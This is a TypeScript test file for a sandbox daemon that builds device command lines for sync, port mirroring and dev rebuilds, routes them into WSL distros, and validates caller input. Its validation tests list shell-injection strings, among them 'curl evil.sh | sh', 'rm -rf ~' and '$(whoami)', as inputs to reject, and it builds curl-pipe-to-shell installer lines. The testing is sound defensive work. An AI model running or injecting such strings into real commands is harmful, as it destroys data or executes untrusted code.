import type { DeviceCommandInput } from "@intentic/sandbox-contract";
import {
    DEV_REBUILD_EXIT_MARK,
    HOST_NATIVE_ENVIRONMENT,
    DEV_REBUILD_QUIET_MARK,
    DeviceCommandInputSchema,
    DeviceLocalDirSchema,
    devRebuildLogPath,
} from "@intentic/sandbox-contract";
import { test, expect } from "bun:test";
import { COMMAND_TIMEOUT_MS, type DeviceCommandFacts, DEVICE_COMMANDS, doorRoute, outcomeOf, streamOf, succeeded } from "./device-commands.js";

// What the daemon knows when it builds a line. Only `sandboxId`, `mode`, `localDir` and `port` ever arrive from a
// caller; the rest is this sandbox's own knowledge of itself and of the door it is talking to, which is the whole
// reason these lines are built here.
const facts = (over: Partial<DeviceCommandFacts> = {}): DeviceCommandFacts => ({
    sandboxId: undefined,
    ownSlug: "work-abc",
    devRoot: undefined,
    publicUrl: "https://work-abc.intentic.dev",
    platform: "linux",
    hostFacts: undefined,
    mode: undefined,
    localDir: undefined,
    port: undefined,
    pairedDir: undefined,
    connections: [],
    pairToken: undefined,
    ...over,
});

test("builds each action's command line from the name alone", () => {
    expect(DEVICE_COMMANDS["mirror-off"].line(facts())).toBe("intentic-machine sync mirror off");
    expect(DEVICE_COMMANDS["mirror-on"].line(facts())).toBe("intentic-machine sync mirror on");
});

test("scopes an action to one paired sandbox when it is given one", () => {
    expect(DEVICE_COMMANDS["mirror-off"].line(facts({ sandboxId: "sandbox-0738cd6b5027-intentic-dev" }))).toBe(
        "intentic-machine sync mirror off --sandbox sandbox-0738cd6b5027-intentic-dev",
    );
});

// Sandbox ids match `[A-Za-z0-9._-]+`: no room for a separator, quote or flag.
test("refuses a sandbox id that could be anything but an id", () => {
    const input = (sandboxId: string): unknown => ({ id: "laptop", command: "mirror-off", sandboxId });
    expect(DeviceCommandInputSchema.safeParse(input("sandbox-0738cd6b5027-intentic-dev")).success).toBe(true);
    for (const hostile of ["a; rm -rf ~", "a && curl evil.sh | sh", "a b", "$(whoami)", "`id`", "--takeover", "a\nb"]) {
        expect(DeviceCommandInputSchema.safeParse(input(hostile)).success).toBe(false);
    }
    expect(DeviceCommandInputSchema.safeParse({ id: "laptop", command: "rm-rf" }).success).toBe(false);
});

// The one caller-supplied string that reaches a command line, so its shape is the guard. `$` is excluded because the
// daemon writes `$HOME` itself when expanding a leading `~` (shellDir).
test("accepts a folder on the device and nothing that could end the argument it sits in", () => {
    for (const folder of ["~/work", "~", "/home/ada/work", "C:\\Users\\Ada\\work", "/home/ada/my work"]) {
        expect(DeviceLocalDirSchema.safeParse(folder).success).toBe(true);
    }
    for (const hostile of [
        '~/work"; rm -rf ~',
        "~/work$HOME",
        "~/work`id`",
        "~/work; curl evil.sh | sh",
        "~/work && id",
        "~/work'",
        "~/work\nrm -rf /",
        "work",
        "",
    ]) {
        expect(DeviceLocalDirSchema.safeParse(hostile).success).toBe(false);
    }
});

// Fixture: mimics run_command's exit-line-plus-fenced-streams text; success reads only the exit line.
const answer = (exit: string, stdout?: string, stderr?: string): { text: string; refused: boolean } => ({
    text: [exit, stdout === undefined ? "" : `--- stdout ---\n${stdout}`, stderr === undefined ? "" : `--- stderr ---\n${stderr}`]
        .filter((part) => part !== "")
        .join("\n"),
    refused: false,
});

test("reads success off the exit line, not off what was printed", () => {
    expect(succeeded("Exit code 0 (success).\n--- stdout ---\nfine")).toBe(true);
    expect(succeeded("Exit code 1 (failed).\n--- stdout ---\nPort mirroring OFF for: x")).toBe(false);
    expect(succeeded("The command was killed after 20s.")).toBe(false);
});

test("splits one stream out of the fenced answer without swallowing the other", () => {
    const text = answer("Exit code 0 (success).", "the good news", "a warning").text;
    expect(streamOf(text, "--- stdout ---")).toBe("the good news");
    expect(streamOf(text, "--- stderr ---")).toBe("a warning");
    expect(streamOf("Exit code 0 (success).", "--- stdout ---")).toBe("");
});

test("shows what the command itself said when it worked", () => {
    const result = outcomeOf("mirror-off", answer("Exit code 0 (success).", "Port mirroring OFF for: sandbox-0738cd6b5027-intentic-dev."));
    expect(result.ok).toBe(true);
    expect(result.message).toBe("Port mirroring OFF for: sandbox-0738cd6b5027-intentic-dev.");
});

test("falls back to its own words when the command printed nothing", () => {
    const result = outcomeOf("mirror-on", answer("Exit code 0 (success)."));
    expect(result.ok).toBe(true);
    expect(result.message).toContain("Port mirroring is back on");
});

test("keeps the machine's own refusal, switch and all", () => {
    const refusal = 'Refused: "Run commands" is switched off for this device.';
    const result = outcomeOf("mirror-off", { text: refusal, refused: true });
    expect(result.ok).toBe(false);
    expect(result.refused).toBe(true);
    expect(result.message).toBe(refusal);
});

// THE DIFFERENCE A POLLING CALLER LIVES ON. Turning the command away is the device's answer to being asked at all and
// will be its answer again; killing a command it accepted is this attempt running out of time, and says nothing about
// the work — which for a detached build is still out there either way.
test("separates a command the device turned away from one it killed", () => {
    const killed = outcomeOf("dev-rebuild-log", answer("The command was killed after 60s."));
    expect(killed.ok).toBe(false);
    expect(killed.refused).toBe(false);
    expect(outcomeOf("mirror-on", answer("Exit code 0 (success).")).refused).toBe(false);
});

// The read is a `stat` and a `tail`; what it has to survive is a login shell — and on a PC a `wsl.exe` session — on a
// machine flat out running the very build being read about. Measured at load 19.5, the default was not enough, and a
// killed read was being read as a failed rebuild.
test("gives the rebuild log read longer than the default to reach a busy machine", () => {
    expect(DEVICE_COMMANDS["dev-rebuild-log"].timeoutMs ?? 0).toBeGreaterThan(COMMAND_TIMEOUT_MS);
});

test("reports a failed command in the machine's words, stderr first", () => {
    const result = outcomeOf("mirror-off", answer("Exit code 127 (failed).", undefined, "intentic-machine: command not found"));
    expect(result.ok).toBe(false);
    expect(result.message).toBe("intentic-machine: command not found");
    expect(result.output).toContain("Exit code 127");
});

// Also a compile check: an action added to the contract's enum with no table row fails to type-check.
test("implements every action the contract names", () => {
    const commands: DeviceCommandInput["command"][] = [
        "mirror-off",
        "mirror-on",
        "mirror-ignore",
        "mirror-unignore",
        "sync-pause",
        "sync-resume",
        "sync-unpair",
        "sync-install",
        "sync-clean",
        "dev-restart",
        "dev-rebuild",
        "dev-rebuild-log",
    ];
    expect(Object.keys(DEVICE_COMMANDS).toSorted()).toEqual(commands.toSorted());
});

// The dev inner loop, run where the checkout is. The slug is this container's own, never the caller's: a reload aimed
// at another sandbox on that machine would restart somebody else's daemon.
test("restarts THIS sandbox from the checkout the container records, not the caller's sandbox", () => {
    const line = DEVICE_COMMANDS["dev-restart"].line(facts({ devRoot: "/home/ada/intentic", sandboxId: "someone-else" }));
    // Spelled in full, prefix included: both dev commands carry the toolchain with them, because the login shell the
    // agent runs never reads the interactive rc pnpm's installer writes PNPM_HOME into.
    expect(line).toBe(
        'export PNPM_HOME="${PNPM_HOME:-$HOME/.local/share/pnpm}"; export PATH="$PNPM_HOME:$PNPM_HOME/bin:$PATH"; sh "/home/ada/intentic"/_sandbox/sandbox/scripts/dev-restart.sh work-abc',
    );
});

// No checkout recorded means every non-dev sandbox, where there is no script to run and no path to guess at.
test("refuses to restart a sandbox that has no checkout behind it", () => {
    expect(DEVICE_COMMANDS["dev-restart"].line(facts())).toBeUndefined();
    expect(DEVICE_COMMANDS["dev-restart"].line(facts({ devRoot: "/home/ada/intentic", ownSlug: undefined }))).toBeUndefined();
    expect(DEVICE_COMMANDS["dev-restart"].needs).toContain("dev-sandbox.sh");
    // A build is minutes; the 20s default would kill it and report a timeout as the answer.
    expect(DEVICE_COMMANDS["dev-restart"].timeoutMs).toBeGreaterThan(60_000);
});

// The dev OUTER loop: the image rebuilt from the checkout. Detached with its output to a log, because the build can run
// past any timeout this door has and the swap at the end kills the daemon that would have read the answer anyway.
test("starts the checkout's rebuild in the background, logging where ic's own logs are", () => {
    const line = DEVICE_COMMANDS["dev-rebuild"].line(facts({ devRoot: "/home/ada/intentic", sandboxId: "someone-else" }));
    expect(line).toBe(
        'export PNPM_HOME="${PNPM_HOME:-$HOME/.local/share/pnpm}"; export PATH="$PNPM_HOME:$PNPM_HOME/bin:$PATH"; ' +
            "detach=$(command -v setsid 2>/dev/null || true); " +
            'mkdir -p "$HOME/.intentic/logs" && cd "/home/ada/intentic" && ' +
            `$detach nohup sh -c 'pnpm rebuild:sandbox work-abc; printf "\\n${DEV_REBUILD_EXIT_MARK} %s\\n" "$?"' ` +
            '> "$HOME/.intentic/logs/dev-rebuild-work-abc.log" 2>&1 & sleep 1',
    );
});

// Both measured on a crossed call, not reasoned about. WSL tears down the session `wsl.exe --exec` made: without the
// second of foreground its exit beat the background job to the fork and left no log file at all, and without a
// session of its own the pnpm/node tree was killed the moment the build phase ended — 77 KB of build output, no exit
// mark, and a card that span for as long as anyone watched it.
test("gives the detached build a session of its own and a moment to start", () => {
    const line = DEVICE_COMMANDS["dev-rebuild"].line(facts({ devRoot: "/home/ada/intentic" })) ?? "";
    expect(line).toContain("detach=$(command -v setsid 2>/dev/null || true);");
    expect(line).toContain("$detach nohup sh -c");
    expect(line).toMatch(/ & sleep 1$/);
    // Resolved, never spelled: a machine with no setsid expands `$detach` to nothing rather than failing the line.
    expect(line).not.toContain("setsid nohup");
});

// The status is appended by the BUILD's own shell, not by the daemon: by the time a rebuild ends, the daemon that
// launched it, the container it ran in and the page that asked for it have all been replaced.
test("has the rebuild write its own exit status where the log outlives everything that started it", () => {
    const line = DEVICE_COMMANDS["dev-rebuild"].line(facts({ devRoot: "/home/ada/intentic" })) ?? "";
    expect(line).toContain(`printf "\\n${DEV_REBUILD_EXIT_MARK} %s\\n" "$?"`);
    // Single-quoted, so `$?` is the inner shell's status when it ends rather than the outer shell's when it starts.
    expect(line).toContain(`nohup sh -c 'pnpm rebuild:sandbox work-abc;`);
});

// The read side, polled while a rebuild runs. Needs only the slug: reading a log takes the log's name, not the checkout.
test("reads the rebuild log back with its mtime, bounded in bytes and lines", () => {
    const line = DEVICE_COMMANDS["dev-rebuild-log"].line(facts({ sandboxId: "someone-else" })) ?? "";
    expect(line).toContain('log="$HOME/.intentic/logs/dev-rebuild-work-abc.log"');
    // Both dialects of mtime, because the machine holding a checkout is as often macOS as it is Linux.
    expect(line).toContain('stat -c %Y "$log" 2>/dev/null || stat -f %m "$log" 2>/dev/null');
    expect(line).toContain(`echo "${DEV_REBUILD_QUIET_MARK} $(( $(date +%s) - at ))"`);
    // Polled every few seconds, and a docker build's log is not small.
    expect(line).toContain('tail -c 12000 "$log" | tail -n 80');
    // No log at all is an answer, not an error: nothing has rebuilt this sandbox from a checkout here.
    expect(line).toContain(`echo "${DEV_REBUILD_QUIET_MARK} -"`);
});

test("cannot name a log for a sandbox that does not know its own name", () => {
    expect(DEVICE_COMMANDS["dev-rebuild-log"].line(facts({ ownSlug: undefined }))).toBeUndefined();
    // Unlike the rebuild beside it, a missing checkout is no obstacle to reading how the last one ended.
    expect(DEVICE_COMMANDS["dev-rebuild-log"].line(facts({ devRoot: undefined }))).toContain("dev-rebuild-work-abc.log");
});

// One reader, one writer, one path: a card that named the log itself could point at a file nothing writes.
test("writes and reads the same log path", () => {
    const written = DEVICE_COMMANDS["dev-rebuild"].line(facts({ devRoot: "/home/ada/intentic" })) ?? "";
    expect(written).toContain(devRebuildLogPath("work-abc").replace("~", "$HOME"));
    expect(DEVICE_COMMANDS["dev-rebuild-log"].line(facts()) ?? "").toContain(devRebuildLogPath("work-abc").replace("~", "$HOME"));
});

// Same rule as the reload beside it: no checkout recorded, no line — a path on somebody's laptop is never guessed.
test("refuses to rebuild a sandbox that has no checkout behind it", () => {
    expect(DEVICE_COMMANDS["dev-rebuild"].line(facts())).toBeUndefined();
    expect(DEVICE_COMMANDS["dev-rebuild"].line(facts({ devRoot: "/home/ada/intentic", ownSlug: undefined }))).toBeUndefined();
    expect(DEVICE_COMMANDS["dev-rebuild"].needs).toContain("dev-sandbox.sh");
    // Detached, so the call itself is instant: a long timeout here would only describe a wait nobody does.
    expect(DEVICE_COMMANDS["dev-rebuild"].timeoutMs).toBeUndefined();
});

// A leading `~` is the owner's home on that machine, expanded by the daemon rather than left for a quoted shell.
test("writes a tilde checkout as $HOME, the one the shell will expand", () => {
    expect(DEVICE_COMMANDS["dev-rebuild"].line(facts({ devRoot: "~/intentic" }))).toContain('cd "$HOME/intentic"');
});

// Parsed from the schema, so a field added to what a caller may ask for cannot leave these asking something stale.
const asked = (command: DeviceCommandInput["command"], id = "rog"): DeviceCommandInput => DeviceCommandInputSchema.parse({ id, command });

const WINDOWS_PC = { os: "Microsoft Windows 11 Home", arch: "x64", shell: "PowerShell 7", home: "C:\\Users\\radar", roots: ["C:\\Users\\radar"] };

// ONE CONNECTED MACHINE IS ENOUGH. The Windows side cannot open a distro's checkout with its own shell, but the
// crossing is a `run_command` argument the machine turns into argv, so the door the owner connected still runs the
// build where the checkout is.
test("crosses a checkout's command into the distro of the Windows PC that holds it", () => {
    const windowsSide = facts({
        platform: "windows",
        devRoot: "/home/radarsu/intentic",
        hostFacts: { ...WINDOWS_PC, wslDistros: ["archlinux", "docker-desktop"] },
    });
    expect(doorRoute(DEVICE_COMMANDS["dev-rebuild"], windowsSide, asked("dev-rebuild"))).toEqual({
        environment: "wsl:archlinux",
        in: "wsl:archlinux",
    });
    expect(doorRoute(DEVICE_COMMANDS["dev-restart"], windowsSide, asked("dev-restart"))).toEqual({
        environment: "wsl:archlinux",
        in: "wsl:archlinux",
    });
    // Reading the log is the same question: it sits in the home of whichever environment ran the build.
    expect(doorRoute(DEVICE_COMMANDS["dev-rebuild-log"], windowsSide, asked("dev-rebuild-log"))).toEqual({
        environment: "wsl:archlinux",
        in: "wsl:archlinux",
    });
    // The distro's own door needs no crossing, and no crossing is ever sent to it.
    const distroSide = facts({ platform: "linux", devRoot: "/home/radarsu/intentic" });
    for (const command of ["dev-rebuild", "dev-restart", "dev-rebuild-log"] as const) {
        expect(doorRoute(DEVICE_COMMANDS[command], distroSide, asked(command))).toEqual({ environment: HOST_NATIVE_ENVIRONMENT });
    }
});

// ITS OWN AGENT BEATS CROSSING. Once the distro is connected in its own right — which one install now does for the
// whole computer — the line goes down that connection: one hop fewer, its own login shell, and no `wsl.exe` session
// to be torn down under a detached build.
test("talks to a connected distro directly instead of crossing into it", () => {
    const bothUp = facts({
        platform: "windows",
        devRoot: "/home/radarsu/intentic",
        hostFacts: { ...WINDOWS_PC, wslDistros: ["archlinux"] },
        connections: [HOST_NATIVE_ENVIRONMENT, "wsl:archlinux"],
    });
    expect(doorRoute(DEVICE_COMMANDS["dev-rebuild"], bothUp, asked("dev-rebuild"))).toEqual({
        environment: "wsl:archlinux",
        connection: "rog::wsl:archlinux",
    });
    // The same machine before that environment came up: crossing is the fallback, not the plan.
    expect(doorRoute(DEVICE_COMMANDS["dev-rebuild"], { ...bothUp, connections: [HOST_NATIVE_ENVIRONMENT] }, asked("dev-rebuild"))).toEqual({
        environment: "wsl:archlinux",
        in: "wsl:archlinux",
    });
});

// What is genuinely out of reach still earns a refusal in words, rather than a PowerShell parse error the reader has
// to decode. An agent that lists no distro is one that would reject `in`: the field and the argument shipped together.
test("refuses a checkout's command only where nothing of that computer can reach it", () => {
    const noDistros = facts({ platform: "windows", devRoot: "/home/radarsu/intentic", hostFacts: WINDOWS_PC });
    const refusal = doorRoute(DEVICE_COMMANDS["dev-rebuild"], noDistros, asked("dev-rebuild")).refusal ?? "";
    expect(refusal).toContain("/home/radarsu/intentic");
    expect(refusal).toContain('"rog"');
    expect(refusal).not.toContain("and nothing here says which");
    // Two real distros: named, so the reader knows which card would answer directly instead.
    const twoDistros = facts({
        platform: "windows",
        devRoot: "/home/radarsu/intentic",
        hostFacts: { ...WINDOWS_PC, wslDistros: ["archlinux", "ubuntu"] },
    });
    const ambiguous = doorRoute(DEVICE_COMMANDS["dev-rebuild"], twoDistros, asked("dev-rebuild")).refusal ?? "";
    expect(ambiguous).toContain("archlinux and ubuntu");
    expect(ambiguous).toContain("connect the one that does");
});

// A command that names no path at all: the CLI's own name, acting on a pairing nothing has reported a folder for.
test("asks nothing about the door for a command that names no path", () => {
    const windowsSide = facts({ platform: "windows" });
    expect(doorRoute(DEVICE_COMMANDS["mirror-off"], windowsSide, asked("mirror-off"))).toEqual({});
    expect(doorRoute(DEVICE_COMMANDS["sync-pause"], windowsSide, asked("sync-pause"))).toEqual({});
});

// WHICH SIDE SYNCS IS THE FOLDER'S ANSWER. The browser names a machine and a folder; nothing about the door decides
// where mutagen ends up running, because only one filesystem has that folder in it.
test("enrolls sync in the environment that holds the folder, in that environment's dialect", () => {
    const pc = { platform: "windows", pairToken: "pair_abc", mode: "sync" as const, hostFacts: { ...WINDOWS_PC, wslDistros: ["archlinux"] } };
    // A distro's folder, asked of the PC's Windows door: crossed, and written for sh.
    const inDistro = facts({ ...pc, localDir: "/home/radarsu/intentic/work" });
    const distroRoute = doorRoute(DEVICE_COMMANDS["sync-install"], inDistro, asked("sync-install"));
    expect(distroRoute).toEqual({ environment: "wsl:archlinux", in: "wsl:archlinux" });
    const distroLine = DEVICE_COMMANDS["sync-install"].line(inDistro, distroRoute) ?? "";
    expect(distroLine).toContain("curl -fsSL https://intentic.dev/sync");
    expect(distroLine).toContain('SYNC_DIR="/home/radarsu/intentic/work"');
    // A Windows folder on the same machine: no crossing, and PowerShell.
    const onWindows = facts({ ...pc, localDir: "C:\\Users\\radar\\intentic" });
    const windowsRoute = doorRoute(DEVICE_COMMANDS["sync-install"], onWindows, asked("sync-install"));
    expect(windowsRoute).toEqual({ environment: HOST_NATIVE_ENVIRONMENT });
    expect(DEVICE_COMMANDS["sync-install"].line(onWindows, windowsRoute) ?? "").toContain("irm https://intentic.dev/sync.ps1 | iex");
});

// A switch over an existing pairing reaches only the agent that started that mutagen session, and the folder the
// pairing reports is what names its environment.
test("sends a sync switch to the environment whose folder the pairing names", () => {
    const pc = { platform: "windows", hostFacts: { ...WINDOWS_PC, wslDistros: ["archlinux"] }, sandboxId: "work-abc" };
    const distro = facts({ ...pc, pairedDir: "/home/radarsu/intentic/work" });
    for (const command of ["sync-pause", "sync-resume", "sync-unpair", "mirror-off", "mirror-on"] as const) {
        expect(doorRoute(DEVICE_COMMANDS[command], distro, asked(command))).toEqual({ environment: "wsl:archlinux", in: "wsl:archlinux" });
    }
    // The same pairing held on the Windows side needs no crossing.
    expect(doorRoute(DEVICE_COMMANDS["sync-pause"], facts({ ...pc, pairedDir: "C:\\Users\\radar\\intentic" }), asked("sync-pause"))).toEqual({
        environment: HOST_NATIVE_ENVIRONMENT,
    });
    // Ports-only: no folder anywhere, so the switch goes to the side the card is named after, where its forwarder is.
    expect(doorRoute(DEVICE_COMMANDS["mirror-on"], facts(pc), asked("mirror-on"))).toEqual({});
});

// The same enrollment the card's copyable one-liner carries — script, env and single-use token — spoken in the shell
// the device actually runs.
test("enrolls a connected device in its own shell's dialect", () => {
    const unix = DEVICE_COMMANDS["sync-install"].line(facts({ pairToken: "pair_abc", mode: "sync", localDir: "~/intentic/work" }));
    expect(unix).toBe(
        "curl -fsSL https://intentic.dev/sync | env SANDBOX_URL='https://work-abc.intentic.dev' PAIR_TOKEN='pair_abc' SYNC_DIR=\"$HOME/intentic/work\" sh",
    );
    const windows = DEVICE_COMMANDS["sync-install"].line(
        facts({ platform: "windows", pairToken: "pair_abc", mode: "sync", localDir: "C:\\Users\\Ada\\work" }),
    );
    expect(windows).toBe(
        "$env:SANDBOX_URL='https://work-abc.intentic.dev'; $env:PAIR_TOKEN='pair_abc'; $env:SYNC_DIR=\"C:\\Users\\Ada\\work\"; irm https://intentic.dev/sync.ps1 | iex",
    );
});

// Mirroring forwards ports and touches no files, so a folder must not ride along even when the card has one.
test("sends no folder for a ports-only enrollment", () => {
    const line = DEVICE_COMMANDS["sync-install"].line(facts({ pairToken: "pair_abc", mode: "mirror", localDir: "~/intentic/work" }));
    expect(line).toBe("curl -fsSL https://intentic.dev/sync | env SANDBOX_URL='https://work-abc.intentic.dev' PAIR_TOKEN='pair_abc' sh");
});

// A device dials this sandbox by its public address; without one the install would enroll against nothing.
test("refuses to enroll a device against a sandbox with no address to dial", () => {
    expect(DEVICE_COMMANDS["sync-install"].line(facts({ pairToken: "pair_abc", publicUrl: "" }))).toBeUndefined();
    expect(DEVICE_COMMANDS["sync-install"].line(facts({ mode: "sync" }))).toBeUndefined();
    expect(DEVICE_COMMANDS["sync-install"].needs).toContain("public address");
    // The one command that mints a credential; every other action must not, as a side effect of being run.
    expect(DEVICE_COMMANDS["sync-install"].mints).toBe(true);
    expect(DEVICE_COMMANDS["mirror-off"].mints).toBeUndefined();
});

// Bare acts on every sandbox the device pairs; omitting the id on sync-unpair would unpair all of them, not just turn
// off one switch.
test("builds each command line from the name and at most the row's own sandbox", () => {
    const row = facts({ sandboxId: "work-abc" });
    expect(DEVICE_COMMANDS["sync-pause"].line(row)).toBe("intentic-machine sync pause --sandbox work-abc");
    expect(DEVICE_COMMANDS["sync-resume"].line(row)).toBe("intentic-machine sync resume --sandbox work-abc");
    expect(DEVICE_COMMANDS["sync-unpair"].line(row)).toBe("intentic-machine sync uninstall --sandbox work-abc");
    expect(DEVICE_COMMANDS["mirror-off"].line(facts())).toBe("intentic-machine sync mirror off");
    expect(DEVICE_COMMANDS["sync-unpair"].requires).toEqual(["sandboxId"]);
    expect(DEVICE_COMMANDS["mirror-off"].requires).toBeUndefined();
});

// The per-port pair carries the number as a flag of its own, and is the only action here that cannot act on a whole
// machine: a port with no sandbox named would be every pairing's copy of that number, which is not what any row means.
test("builds the per-port mirror switches from the sandbox and the port together", () => {
    const row = facts({ sandboxId: "work-abc", port: 5440 });
    expect(DEVICE_COMMANDS["mirror-ignore"].line(row)).toBe("intentic-machine sync mirror ignore --sandbox work-abc --port 5440");
    expect(DEVICE_COMMANDS["mirror-unignore"].line(row)).toBe("intentic-machine sync mirror unignore --sandbox work-abc --port 5440");
    expect(DEVICE_COMMANDS["mirror-ignore"].requires).toEqual(["sandboxId", "port"]);
    expect(DEVICE_COMMANDS["mirror-unignore"].requires).toEqual(["sandboxId", "port"]);
});

// The one caller-supplied value that reaches a command line as a number. The schema is what keeps it one: a string
// carrying a shell metacharacter would otherwise land inside the argv the daemon builds.
test("takes only a real port number from a caller", () => {
    const ask = (port: unknown): unknown => DeviceCommandInputSchema.safeParse({ id: "host-1", command: "mirror-ignore", port }).success;
    expect(ask(5440)).toBe(true);
    expect(ask(65_536)).toBe(false);
    expect(ask(0)).toBe(false);
    expect(ask(5440.5)).toBe(false);
    expect(ask("5440; rm -rf /")).toBe(false);
});
